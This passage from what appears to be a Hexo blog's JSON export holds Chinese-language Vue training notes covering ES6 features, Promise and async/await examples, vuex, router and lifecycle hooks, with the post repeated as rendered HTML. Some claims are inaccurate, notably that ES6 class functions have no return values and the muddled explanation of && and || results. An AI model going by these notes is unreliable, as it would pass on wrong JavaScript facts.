- dispatch(action)，组件上使用\n  - action(commit) -> 允许异步\n  - mutation -> 同步，修改状态\n\n## vue 组件生命周期\n\n- 初始化阶段：beforeCreate、created、beforeMount、mounted\n- 运行中：beforeUpdate、updated\n- 销毁阶段：beforeDestroy、destroyed\n\n## vue3\n\n1. 响应式数据声明\n\n- ref，声明基础数据类型\n- reactive，声明复杂数据类型\n\n2. setup\n","slug":"2023/10/Vue前端培训","published":1,"updated":"2023-10-21T06:55:16.142Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj3001pzge30qyh3d7l","content":"<p>2023 Vue 前端开发技术与实战培训</p>\n<span id=\"more\"></span>\n\n<h1 id=\"准备知识点\"><a href=\"#准备知识点\" class=\"headerlink\" title=\"准备知识点\"></a>准备知识点</h1><h2 id=\"true-or-false\"><a href=\"#true-or-false\" class=\"headerlink\" title=\"true or false?\"></a>true or false?</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">3</span> &amp;&amp; <span class=\"number\">4</span>) <span class=\"comment\">// 4</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">3</span> || <span class=\"number\">4</span>) <span class=\"comment\">// 3</span></span><br></pre></td></tr></table></figure>\n\n<p>条件为 true 时返回最后一次的真实值。</p>\n<h2 id=\"ES6-的-OOP-要点\"><a href=\"#ES6-的-OOP-要点\" class=\"headerlink\" title=\"ES6 的 OOP 要点\"></a>ES6 的 OOP 要点</h2><ul>\n<li>没有公有、私有属性。</li>\n<li>有属于对象的和属于类的属性。常规的函数是属于类的，this 是属于对象的。</li>\n<li>ES6 是没有类型的，所以类函数也没有返回值。</li>\n<li>继承：子类构造函数内，需要先调用父类的构造函数。</li>\n</ul>\n<h2 id=\"ES6-部分特性\"><a href=\"#ES6-部分特性\" class=\"headerlink\" title=\"ES6 部分特性\"></a>ES6 部分特性</h2><ol>\n<li>字面量：</li>\n<li>字符串模版：反引号</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> n = <span class=\"string\">&#x27;aaa&#x27;</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`your result is <span class=\"subst\">$&#123;<span class=\"number\">3</span> || <span class=\"number\">4</span>&#125;</span>, your name is <span class=\"subst\">$&#123;n&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>解构：对数组或者 JSON 拆解，让代码更简洁</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> info = [<span class=\"string\">&#x27;zhang&#x27;</span>, <span class=\"number\">18</span>]</span><br><span class=\"line\"><span class=\"comment\">// let name = info[0]</span></span><br><span class=\"line\"><span class=\"comment\">// let age = info[1]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> [name, age] = info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> info2 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;zhang&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">18</span> &#125;</span><br><span class=\"line\"><span class=\"comment\">// let name = info2.name</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> &#123; name, age &#125; = info2</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>默认值</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">hello</span>(<span class=\"params\">name = <span class=\"string\">&#x27;es6 default&#x27;</span></span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// let name = name || &#x27;traditional default&#x27;;</span></span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`hello <span class=\"subst\">$&#123;name&#125;</span>`</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>不定参数：形参</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">add</span>(<span class=\"params\">a, ...x</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x.<span class=\"title function_\">reduce</span>(<span class=\"function\">(<span class=\"params\">accumulator, currentVal</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> accumulator + currentVal</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title function_\">add</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>)) <span class=\"comment\">// 20</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>拓展参数：实参</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">sayHello</span>(<span class=\"params\">name1, name2, name3</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`hello <span class=\"subst\">$&#123;name1&#125;</span>, hello <span class=\"subst\">$&#123;name2&#125;</span>, hello <span class=\"subst\">$&#123;name3&#125;</span>`</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> names = [<span class=\"string\">&#x27;zhangsan&#x27;</span>, <span class=\"string\">&#x27;lisi&#x27;</span>, <span class=\"string\">&#x27;wangwu&#x27;</span>]</span><br><span class=\"line\"><span class=\"title function_\">sayHello</span>(...names)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><p>Proxies</p>\n</li>\n<li><p>Promise</p>\n</li>\n</ol>\n<blockquote>\n<p>状态：</p>\n<p>成功：resolved；<br>失败：rejected；<br>进行中：pending；</p>\n<p>状态的转化：</p>\n<p>pending -&gt; resolved，使用 resolve()；<br>pending -&gt; rejected，使用 reject()；</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cook</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`cook food started`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`cook food finished`</span>)</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;cooked-food&#x27;</span>)</span><br><span class=\"line\">      <span class=\"comment\">// reject(&#x27;boom here&#x27;)</span></span><br><span class=\"line\">    &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">eat</span>(<span class=\"params\">food</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`start eating <span class=\"subst\">$&#123;food&#125;</span>`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`stop eating <span class=\"subst\">$&#123;food&#125;</span>`</span>)</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;empty-dishes&#x27;</span>)</span><br><span class=\"line\">    &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">wash</span>(<span class=\"params\">dishes</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`start washing <span class=\"subst\">$&#123;dishes&#125;</span>`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`stop washing <span class=\"subst\">$&#123;dishes&#125;</span>`</span>)</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;finished&#x27;</span>)</span><br><span class=\"line\">    &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">cook</span>()</span><br><span class=\"line\">  .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"title function_\">eat</span>(data))</span><br><span class=\"line\">  .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"title function_\">wash</span>(data))</span><br><span class=\"line\">  .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`result: <span class=\"subst\">$&#123;data&#125;</span>`</span>))</span><br><span class=\"line\">  .<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`error: <span class=\"subst\">$&#123;error&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>\n\n<p><code>async</code>：加在 function 前可以自动返回 promise 对象；<br><code>await</code>：加在调用的 promise function 前可以阻塞异步请求，变为顺序执行；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">func1</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;func1 return&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">func2</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// await func1().then((data) =&gt; console.log(data));</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;func2 return&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">func2</span>().<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Promise</span>.<span class=\"title function_\">all</span>([<span class=\"title function_\">func1</span>(), <span class=\"title function_\">func2</span>()]).<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Vue\"><a href=\"#Vue\" class=\"headerlink\" title=\"Vue\"></a>Vue</h1><h2 id=\"特殊变量\"><a href=\"#特殊变量\" class=\"headerlink\" title=\"特殊变量\"></a>特殊变量</h2><ol>\n<li>观察变量</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">watch</span>: &#123;</span><br><span class=\"line\">  <span class=\"attr\">a</span>: <span class=\"function\">(<span class=\"params\">newVal</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`watch:<span class=\"subst\">$&#123;newVal&#125;</span>`</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>实时计算变量</li>\n</ol>\n<ul>\n<li>不能在 data 里声明</li>\n<li>必须在 computed 里面声明</li>\n<li>需要在 view 里面使用</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">computed</span>: &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"router\"><a href=\"#router\" class=\"headerlink\" title=\"router\"></a>router</h2><ul>\n<li>定义好组件（用户页）</li>\n<li>把用户页和路由地址（Path）一一对应，这个对应的管理工作就是 router</li>\n<li>再把 router 配置到 vue 对象上，一起挂载到 DOM 对象</li>\n<li>view 需要有 router-view 及 router-link</li>\n</ul>\n<h2 id=\"vuex\"><a href=\"#vuex\" class=\"headerlink\" title=\"vuex\"></a>vuex</h2><ul>\n<li>声明全局状态</li>\n<li>读：<ul>\n<li>getter</li>\n<li>mapper 映射+Computed</li>\n</ul>\n</li>\n<li>写：<ul>\n<li>dispatch(action)，组件上使用</li>\n<li>action(commit) -&gt; 允许异步</li>\n<li>mutation -&gt; 同步，修改状态</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"vue-组件生命周期\"><a href=\"#vue-组件生命周期\" class=\"headerlink\" title=\"vue 组件生命周期\"></a>vue 组件生命周期</h2><ul>\n<li>初始化阶段：beforeCreate、created、beforeMount、mounted</li>\n<li>运行中：beforeUpdate、updated</li>\n<li>销毁阶段：beforeDestroy、destroyed</li>\n</ul>\n<h2 id=\"vue3\"><a href=\"#vue3\" class=\"headerlink\" title=\"vue3\"></a>vue3</h2><ol>\n<li>响应式数据声明</li>\n</ol>\n<ul>\n<li>ref，声明基础数据类型</li>\n<li>reactive，声明复杂数据类型</li>\n</ul>\n<ol start=\"2\">\n<li>setup</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>2023 Vue 前端开发技术与实战培训</p>","more":"<h1 id=\"准备知识点\"><a href=\"#准备知识点\" class=\"headerlink\" title=\"准备知识点\"></a>准备知识点</h1><h2 id=\"true-or-false\"><a href=\"#true-or-false\" class=\"headerlink\" title=\"true or false?\"></a>true or false?</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">3</span> &amp;&amp; <span class=\"number\">4</span>) <span class=\"comment\">// 4</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">3</span> || <span class=\"number\">4</span>) <span class=\"comment\">// 3</span></span><br></pre></td></tr></table></figure>\n\n<p>条件为 true 时返回最后一次的真实值。</p>\n<h2 id=\"ES6-的-OOP-要点\"><a href=\"#ES6-的-OOP-要点\" class=\"headerlink\" title=\"ES6 的 OOP 要点\"></a>ES6 的 OOP 要点</h2><ul>\n<li>没有公有、私有属性。</li>\n<li>有属于对象的和属于类的属性。常规的函数是属于类的，this 是属于对象的。</li>\n<li>ES6 是没有类型的，所以类函数也没有返回值。</li>\n<li>继承：子类构造函数内，需要先调用父类的构造函数。</li>\n</ul>\n<h2 id=\"ES6-部分特性\"><a href=\"#ES6-部分特性\" class=\"headerlink\" title=\"ES6 部分特性\"></a>ES6 部分特性</h2><ol>\n<li>字面量：</li>\n<li>字符串模版：反引号</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> n = <span class=\"string\">&#x27;aaa&#x27;</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`your result is <span class=\"subst\">$&#123;<span class=\"number\">3</span> || <span class=\"number\">4</span>&#125;</span>, your name is <span class=\"subst\">$&#123;n&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>解构：对数组或者 JSON 拆解，让代码更简洁</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> info = [<span class=\"string\">&#x27;zhang&#x27;</span>, <span class=\"number\">18</span>]</span><br><span class=\"line\"><span class=\"comment\">// let name = info[0]</span></span><br><span class=\"line\"><span class=\"comment\">// let age = info[1]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> [name, age] = info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> info2 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;zhang&#x27;</span>, <span class=\"attr\">age</span>: <span class=\"number\">18</span> &#125;</span><br><span class=\"line\"><span class=\"comment\">// let name = info2.name</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> &#123; name, age &#125; = info2</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>默认值</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">hello</span>(<span class=\"params\">name = <span class=\"string\">&#x27;es6 default&#x27;</span></span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// let name = name || &#x27;traditional default&#x27;;</span></span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`hello <span class=\"subst\">$&#123;name&#125;</span>`</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>不定参数：形参</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">add</span>(<span class=\"params\">a, ...x</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x.<span class=\"title function_\">reduce</span>(<span class=\"function\">(<span class=\"params\">accumulator, currentVal</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> accumulator + currentVal</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title function_\">add</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>)) <span class=\"comment\">// 20</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>拓展参数：实参</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">sayHello</span>(<span class=\"params\">name1, name2, name3</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`hello <span class=\"subst\">$&#123;name1&#125;</span>, hello <span class=\"subst\">$&#123;name2&#125;</span>, hello <span class=\"subst\">$&#123;name3&#125;</span>`</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> names = [<span class=\"string\">&#x27;zhangsan&#x27;</span>, <span class=\"string\">&#x27;lisi&#x27;</span>, <span class=\"string\">&#x27;wangwu&#x27;</span>]</span><br><span class=\"line\"><span class=\"title function_\">sayHello</span>(...names)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><p>Proxies</p>\n</li>\n<li><p>Promise</p>\n</li>\n</ol>\n<blockquote>\n<p>状态：</p>\n<p>成功：resolved；<br>失败：rejected；<br>进行中：pending；</p>\n<p>状态的转化：</p>\n<p>pending -&gt; resolved，使用 resolve()；<br>pending -&gt; rejected，使用 reject()；</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cook</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`cook food started`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`cook food finished`</span>)</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;cooked-food&#x27;</span>)</span><br><span class=\"line\">      <span class=\"comment\">// reject(&#x27;boom here&#x27;)</span></span><br><span class=\"line\">    &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">eat</span>(<span class=\"params\">food</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`start eating <span class=\"subst\">$&#123;food&#125;</span>`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`stop eating <span class=\"subst\">$&#123;food&#125;</span>`</span>)</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;empty-dishes&#x27;</span>)</span><br><span class=\"line\">    &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">wash</span>(<span class=\"params\">dishes</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`start washing <span class=\"subst\">$&#123;dishes&#125;</span>`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`stop washing <span class=\"subst\">$&#123;dishes&#125;</span>`</span>)</span><br><span class=\"line\">      <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;finished&#x27;</span>)</span><br><span class=\"line\">    &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">cook</span>()</span><br><span class=\"line\">  .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"title function_\">eat</span>(data))</span><br><span class=\"line\">  .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"title function_\">wash</span>(data))</span><br><span class=\"line\">  .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`result: <span class=\"subst\">$&#123;data&#125;</span>`</span>))</span><br><span class=\"line\">  .<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`error: <span class=\"subst\">$&#123;error&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>\n\n<p><code>async</code>：加在 function 前可以自动返回 promise 对象；<br><code>await</code>：加在调用的 promise function 前可以阻塞异步请求，变为顺序执行；</p>\n<figure 